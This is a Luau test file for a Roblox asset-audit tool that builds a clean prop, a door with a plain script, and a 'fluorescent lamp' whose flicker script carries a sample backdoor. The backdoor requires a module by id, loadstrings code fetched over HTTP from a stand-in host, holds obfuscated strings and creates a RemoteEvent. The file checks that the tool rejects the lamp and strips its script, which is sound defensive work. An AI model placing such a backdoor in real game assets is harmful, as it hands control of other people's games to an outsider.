--[[
	Tests for tools/lib/asset_audit.luau with models built here: a clean
	decorative prop, a "lamp" carrying a typical backdoor, and a prop with a
	harmless script. Round-trips through .rbxm (as Studio saves them).

	  lune run tools/audit_asset_test.luau
]]

local fs = require("@lune/fs")
local process = require("@lune/process")
local roblox = require("@lune/roblox")
local AssetAudit = require("./lib/asset_audit")

local Instance = roblox.Instance
local Vector3 = roblox.Vector3
local CFrame = roblox.CFrame

local checks, failures = 0, 0
local function check(cond: boolean, msg: string)
	checks += 1
	if not cond then
		failures += 1
		print("FAIL " .. msg)
	end
end

local function part(parent, name, size, cf, class)
	local p = Instance.new(class or "Part")
	p.Name = name
	p.Size = size
	p.CFrame = cf
	p.Anchored = true
	p.Parent = parent
	return p
end

local function roundTrip(model)
	fs.writeDir("build")
	fs.writeFile("build/audit_tmp.rbxm", roblox.serializeModel({ model }))
	return roblox.deserializeModel(fs.readFile("build/audit_tmp.rbxm"))
end

local function has(report, rule: string): boolean
	for _, f in report.findings do
		if f.rule == rule then
			return true
		end
	end
	return false
end

-- 1. a clean filing cabinet: parts, a mesh, a texture, no scripts
do
	local m = Instance.new("Model")
	m.Name = "FilingCabinet"
	local body = part(m, "Body", Vector3.new(2, 5, 2.4), CFrame.new(0, 2.5, 0))
	body.Material = roblox.Enum.Material.Metal
	local handle = part(m, "Handle", Vector3.new(0.6, 0.1, 0.1), CFrame.new(0, 4, -1.25), "MeshPart")
	handle.CanCollide = false
	local decal = Instance.new("Decal")
	decal.Texture = "rbxassetid://1234567"
	decal.Parent = body
	local report = AssetAudit.audit(roundTrip(m))
	check(AssetAudit.verdict(report) == "NO-PATTERN-FOUND", "clean prop: no pattern found (" .. AssetAudit.verdict(report) .. ")")
	check(report.counts.parts == 2 and report.counts.meshParts == 1 and report.counts.scripts == 0, "clean prop: counts")
	check(report.counts.colliding == 1, "clean prop: one colliding part")
	check(report.assets["1234567"] ~= nil, "clean prop: its texture is listed as a dependency")
	check(report.size and math.abs(report.size.Y - 5) < 1e-3, "clean prop: size measured")
end

-- 2. a "fluorescent lamp" with a backdoor
do
	local m = Instance.new("Model")
	m.Name = "FluorescentLamp"
	local tube = part(m, "Tube", Vector3.new(0.4, 0.2, 4), CFrame.new(0, 9.8, 0))
	local light = Instance.new("SurfaceLight")
	light.Shadows = true
	light.Parent = tube
	local s = Instance.new("Script")
	s.Name = "Flicker"
	s.Source = table.concat({
		"local l = script.Parent.Tube.SurfaceLight",
		"while true do l.Enabled = not l.Enabled task.wait(math.random()) end",
		"require(4815162342)",
		"loadstring(game:GetService('HttpService'):GetAsync('http://example.invalid/x'))()",
		"local llIlIlII1lI = '\\108\\111\\97\\100\\115\\116\\114\\105\\110\\103' .. string.rep('\\120', 1)",
		string.rep("\\100", 45),
		"Instance.new('RemoteEvent', game.ReplicatedStorage)",
	}, "\n")
	s.Parent = m
	local roots = roundTrip(m)
	local report = AssetAudit.audit(roots)
	check(AssetAudit.verdict(report) == "REJECT", "backdoor lamp: rejected")
	check(has(report, "require-by-id"), "backdoor lamp: require(<id>) found")
	check(has(report, "loadstring"), "backdoor lamp: loadstring found")
	check(has(report, "http"), "backdoor lamp: HTTP found")
	check(has(report, "obfuscation"), "backdoor lamp: obfuscation found")
	check(has(report, "new-remote"), "backdoor lamp: new remote found")
	check(has(report, "shadow-lights"), "backdoor lamp: shadow light noted")
	-- the stripped copy keeps the lamp, loses the script
	local stripped = AssetAudit.strip(roots)
	local again = AssetAudit.audit(roundTrip(stripped[1]))
	check(again.counts.scripts == 0 and again.counts.parts == 1 and again.counts.lights == 1, "backdoor lamp: stripped copy keeps the geometry and light, no scripts")
	check(AssetAudit.verdict(again) ~= "REJECT", "backdoor lamp: stripped copy no longer rejected")
	local text = AssetAudit.format(report, "FluorescentLamp.rbxm")
	check(string.find(text, "REJECT", 1, true) ~= nil and string.find(text, "require-by-id", 1, true) ~= nil, "report text names the verdict and the rule")
end

-- 3. a door with an ordinary open/close script: review, not reject
do
	local m = Instance.new("Model")
	m.Name = "Door"
	local leaf = part(m, "Leaf", Vector3.new(4, 7, 0.3), CFrame.new(0, 3.5, 0))
	local s = Instance.new("Script")
	s.Source = "local cd = Instance.new('ClickDetector', script.Parent.Leaf)\ncd.MouseClick:Connect(function() script.Parent.Leaf.Transparency = 0.5 end)"
	s.Parent = m
	local _ = leaf
	local report = AssetAudit.audit(roundTrip(m))
	check(AssetAudit.verdict(report) == "REVIEW", "door with a plain script: review (" .. AssetAudit.verdict(report) .. ")")
	check(has(report, "has-scripts") and not has(report, "require-by-id"), "door: flagged for having a script, nothing worse")
end

print(string.format("%d checks, %d failures", checks, failures))
if failures > 0 then
	process.exit(1)
end
